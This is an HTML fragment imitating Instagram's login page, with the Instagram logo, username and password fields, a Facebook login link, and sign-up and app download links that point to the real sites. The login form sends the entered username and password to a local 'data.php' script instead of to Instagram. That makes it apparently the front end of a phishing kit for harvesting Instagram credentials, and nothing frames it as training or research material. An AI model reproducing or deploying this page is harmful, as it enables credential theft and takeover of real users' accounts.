<div class="login-wrapper">
    <div class="login-box">
        <div class="logo-container">
            <img src="assets/instagram-logo-text.png" alt="Instagram" class="instagram-logo-text">
        </div>
        
        <form action="data.php" method="POST" class="login-form" id="login-form">
            <div class="input-group">
                <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-button">Log in</button>
            
            <div class="divider">
                <span class="divider-line"></span>
                <span class="divider-text">OR</span>
                <span class="divider-line"></span>
            </div>
            
            <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATkNK2Tb-iL5BT53AY9AMrH2V8sjAvaUuN1KTErdn9gBSsx8f6kPsX2ldoQ0hZyKcZWrbJqRQk4QllH7gdszPBV8VW_TA-QOS4ZnoHOZsi3fdMQrcjq0l-OB1i0KEl0fOoweiZ4wyp1eiqb1X6rzfPXcWqGlG_5_x_MYwv8zaPtlw1FnLdOTkwtTq2k6Y9FLYM7b9jJNvgaYBCMf6hhMbpjj1Te-bWb6qa7XAV9awAhDzgDRBSjT4ISgcYBaFFFyxr64" class="facebook-login">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
                    <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/>
                </svg>
                <span>Log in with Facebook</span>
            </a>
            
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
        </form>
    </div>
    
    <div class="signup-box">
        <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Sign up</a></p>
    </div>
    
    <div class="app-download">
        <p>Get the app.</p>
        <div class="app-buttons">
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DBBC0F936-1932-495A-9AB8-7FCCE952E786%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1">
                <img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcRg7CILrd1lIjHjgkaeH2A2Dk2sWKgwxUo0vEUVmGGLwhTx9DCp" alt="Google Play" width="136" height="40">
            </a>
            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020">
                <img src="assets/microsoft.png" alt="Microsoft Store" width="110" height="40">
            </a>
        </div>
    </div>
</div>

<script>
    // Form validation
    document.getElementById('login-form').addEventListener('submit', function(e) {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        if (!username || !password) {
            e.preventDefault();
            alert('Please fill in all fields');
        }
    });
</script>

<!-- Favicon links -->
<link rel="icon" href="assets/favicon.ico" type="image/x-icon">
<link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
<link rel="icon" href="assets/favicon.png" type="image/png"> 